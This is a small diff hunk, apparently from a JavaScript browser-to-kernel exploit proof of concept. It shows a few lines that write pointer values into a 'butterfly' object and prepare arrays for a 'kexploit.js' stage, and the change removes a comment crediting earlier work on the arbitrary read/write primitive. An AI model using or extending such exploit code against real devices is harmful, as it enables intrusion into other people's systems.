@@ -378,7 +378,7 @@ function poc() {
         write_ptr_at(butterfly + 248, 0x1f0000001f);
     })();
 
-    //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
+    
 
     //create compat stuff for kexploit.js
     var expl_master = new Uint32Array(8);
